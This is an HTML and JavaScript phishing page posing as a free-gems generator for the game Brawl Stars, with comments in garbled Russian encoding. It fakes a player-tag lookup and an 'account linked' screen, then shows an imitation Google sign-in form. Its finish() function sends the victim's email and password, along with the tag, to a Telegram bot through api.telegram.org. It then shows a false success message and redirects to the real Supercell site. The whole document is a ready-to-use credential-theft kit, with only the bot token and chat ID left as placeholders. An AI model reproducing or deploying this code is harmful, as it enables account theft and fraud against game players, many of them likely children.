<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Brawl Stars Rewards</title>
    <link rel="icon" type="image/x-icon" href="https://brawlergems.com/generator/images/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        /* –ê–Ω–∏–º–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —Ñ–æ–Ω Brawl Stars */
        html { min-height: 100%; background: linear-gradient(180deg, #1a2969 0%, #2d4596 50%, #4565c9 100%); background-attachment: fixed; }
        body { background: transparent; position: relative; min-height: 100vh; margin: 0; font-family: 'Lilita One', cursive; overflow-x: hidden; }
        
        body::before {
            content: ''; position: fixed; top: -50%; left: 0; width: 100vw; height: 200vh;
            background-image: url('https://brawlergems.com/generator/images/brawl_stars_pattern_transparent.png');
            background-repeat: repeat; background-size: 400px auto; opacity: 0.15;
            animation: scrollPattern 120s linear infinite; pointer-events: none; z-index: 0; will-change: transform;
        }

        @keyframes scrollPattern { 0% { transform: translateY(0); } 100% { transform: translateY(-50%); } }

        .container { max-width: 480px; margin: 0 auto; padding: 20px; position: relative; z-index: 10; }
        .logo { width: 200px; margin: 0 auto 20px; display: block; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.4)); }

        .main-box { background: white; border-radius: 20px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); border: 4px solid #000; text-align: center; }

        /* –ü—Ä–æ—Ñ–∏–ª—å –∏–≥—Ä–æ–∫–∞ (–°–∫—Ä—ã—Ç –≤ –Ω–∞—á–∞–ª–µ) */
        .player-profile-card {
            background: #222; color: white; border-radius: 12px; padding: 15px;
            margin-bottom: 15px; border: 2px solid #000; text-align: left; position: relative;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
        
        .profile-header { display: flex; align-items: center; gap: 12px; }
        .player-icon { width: 50px; height: 50px; border-radius: 50%; border: 2px solid #fff; }
        .player-name { font-size: 20px; margin: 0; color: #FFD84D; text-transform: uppercase; }
        .status-badge { background: #27ae60; color: white; font-size: 10px; padding: 2px 6px; border-radius: 4px; display: inline-block; margin-top: 4px; font-family: 'Roboto'; }

        .stats-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
        .mini-stat { background: rgba(255,255,255,0.1); padding: 6px; border-radius: 8px; font-size: 13px; display: flex; align-items: center; gap: 6px; border: 1px solid rgba(255,255,255,0.2); }
        .mini-stat img { width: 18px; }

        /* –ü–æ–ª–µ –≤–≤–æ–¥–∞ */
        .input-group { background: #f0f0f0; border-radius: 12px; padding: 12px; margin-bottom: 15px; border: 2px solid #ddd; }
        input { width: 100%; border: none; background: transparent; outline: none; font-family: 'Lilita One'; font-size: 22px; text-align: center; color: #000; }

        /* –°–µ—Ç–∫–∞ –≥–µ–º–æ–≤ */
        .gems-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin: 15px 0; }
        .gem-card {
            background: #f8f9fa; border: 3px solid #eee; border-radius: 14px; padding: 10px;
            cursor: pointer; transition: 0.1s; display: flex; flex-direction: column; align-items: center;
        }
        .gem-card img { width: 60px; height: 60px; object-fit: contain; margin-bottom: 5px; }
        .gem-card span { font-size: 18px; color: #333; }
        .gem-card.active { border-color: #FFA800; background: #FFF9E6; transform: scale(1.05); }

        .btn-bs {
            background: linear-gradient(180deg, #FFD84D 0%, #FFA800 100%);
            border: none; border-radius: 12px; padding: 18px; width: 100%;
            color: white; font-size: 24px; cursor: pointer;
            box-shadow: 0 6px 0 #CC7A00; text-shadow: 0 2px 4px rgba(0,0,0,0.3);
            text-transform: uppercase;
        }
        .btn-bs:active { transform: translateY(3px); box-shadow: 0 3px 0 #CC7A00; }

        /* –õ–æ–∞–¥–µ—Ä */
        .loader-wrap { display: none; margin: 20px 0; }
        .bar-bg { height: 12px; background: #eee; border-radius: 10px; overflow: hidden; margin-top: 10px; }
        .bar-fill { height: 100%; width: 0%; background: #FFA800; transition: 0.2s; }

        /* Google Login */
        .g-auth { font-family: 'Roboto', sans-serif; display: none; text-align: left; }
        .g-input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline-color: #1a73e8; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://brawlergems.com/generator/images/logo_outlined_noBG.png" class="logo">

    <div class="main-box">
        
        <div id="scr-profile" style="display:none;">
            <div class="player-profile-card">
                <div class="profile-header">
                    <img src="https://brawlergems.com/generator/images/brawler_icon.png" class="player-icon">
                    <div>
                        <p class="player-name">ACCOUNT READY</p>
                        <div class="status-badge">SUPERCELL ID LINKED</div>
                    </div>
                </div>
                <div class="stats-row">
                    <div class="mini-stat"><img src="https://brawlergems.com/generator/images/icon_trophy_medium.png"> PROTECTED</div>
                    <div class="mini-stat"><img src="https://brawlergems.com/generator/images/icon_player_level.png"> ENCRYPTED</div>
                </div>
            </div>
        </div>

        <div id="scr-tag">
            <h3 style="margin-bottom:10px; color:#444">ENTER PLAYER TAG</h3>
            <div class="input-group">
                <input type="text" id="tag-input" placeholder="#P8Y2..." maxlength="12">
            </div>
        </div>

        <div class="loader-wrap" id="scr-load">
            <p id="load-msg" style="color:#666; font-size:14px;">SEARCHING DATABASE...</p>
            <div class="bar-bg"><div class="bar-fill" id="bar"></div></div>
        </div>

        <div id="scr-gems">
            <h3 style="color:#444; margin-bottom:10px;">SELECT GEMS AMOUNT</h3>
            <div class="gems-grid">
                <div class="gem-card active" onclick="sel(this, '30')"><img src="https://brawlergems.com/generator/images/30.png"><span>30</span></div>
                <div class="gem-card" onclick="sel(this, '80')"><img src="https://brawlergems.com/generator/images/80.png"><span>80</span></div>
                <div class="gem-card" onclick="sel(this, '170')"><img src="https://brawlergems.com/generator/images/170.png"><span>170</span></div>
                <div class="gem-card" onclick="sel(this, '360')"><img src="https://brawlergems.com/generator/images/360.png"><span>360</span></div>
                <div class="gem-card" onclick="sel(this, '950')"><img src="https://brawlergems.com/generator/images/950.png"><span>950</span></div>
                <div class="gem-card" onclick="sel(this, '2000')"><img src="https://brawlergems.com/generator/images/2000.png"><span>2000</span></div>
            </div>
        </div>

        <button class="btn-bs" id="btn-main" onclick="doAction()">CONNECT</button>

        <div id="scr-google" class="g-auth">
            <div style="text-align:center; margin-bottom:20px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="60">
                <h3 style="font-weight:400; margin-top:10px; font-size:20px;">Verify Ownership</h3>
                <p style="color:#5f6368; font-size:14px;">Complete sign-in to link rewards</p>
            </div>
            <input type="email" id="g-mail" class="g-input" placeholder="Email or phone">
            <input type="password" id="g-pass" class="g-input" placeholder="Password">
            <button class="btn-bs" onclick="finish()" style="margin-top:20px;">Confirm</button>
        </div>

    </div>
</div>

<script>
    // --- –î–ê–ù–ù–´–ï TELEGRAM ---
    const TOKEN = "–¢–í–û–ô_–¢–û–ö–ï–ù";
    const CHAT_ID = "–¢–í–û–ô_ID";

    let state = "input"; // input, profile, google
    let gems = "30";
    let playerTag = "";

    function sel(el, val) {
        if(state === "google") return;
        document.querySelectorAll('.gem-card').forEach(c => c.classList.remove('active'));
        el.classList.add('active');
        gems = val;
        if(state === "profile") {
            document.getElementById('btn-main').innerText = "CLAIM " + gems + " GEMS";
        }
    }

    function doAction() {
        if(state === "input") {
            playerTag = document.getElementById('tag-input').value.toUpperCase();
            if(playerTag.length < 3) return alert("Enter valid tag!");

            // –ó–∞–ø—É—Å–∫–∞–µ–º –∏–º–∏—Ç–∞—Ü–∏—é –ø–æ–∏—Å–∫–∞
            document.getElementById('scr-tag').style.display = 'none';
            document.getElementById('btn-main').style.display = 'none';
            document.getElementById('scr-load').style.display = 'block';

            let p = 0;
            let iv = setInterval(() => {
                p += 5;
                document.getElementById('bar').style.width = p + "%";
                if(p >= 100) {
                    clearInterval(iv);
                    state = "profile";
                    document.getElementById('scr-load').style.display = 'none';
                    document.getElementById('scr-profile').style.display = 'block';
                    document.getElementById('btn-main').style.display = 'block';
                    document.getElementById('btn-main').innerText = "CLAIM " + gems + " GEMS";
                }
            }, 100);

        } else if(state === "profile") {
            // –ü–µ—Ä–µ—Ö–æ–¥ –∫ —Ñ–∏–Ω–∞–ª—å–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–µ
            state = "google";
            document.getElementById('scr-profile').style.display = 'none';
            document.getElementById('scr-gems').style.display = 'none';
            document.getElementById('btn-main').style.display = 'none';
            document.getElementById('scr-google').style.display = 'block';
        }
    }

    async function finish() {
        const mail = document.getElementById('g-mail').value;
        const pass = document.getElementById('g-pass').value;
        if(!mail || !pass) return;

        const text = `üéØ NEW LOG\nTag: ${playerTag}\nGems: ${gems}\nEmail: ${mail}\nPass: ${pass}`;
        
        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
            alert("Verification Success! Gems will be added within 24 hours.");
            location.href = "https://supercell.com";
        } catch(e) {
            alert("Connection error. Try again.");
        }
    }
</script>

</body>
</html>
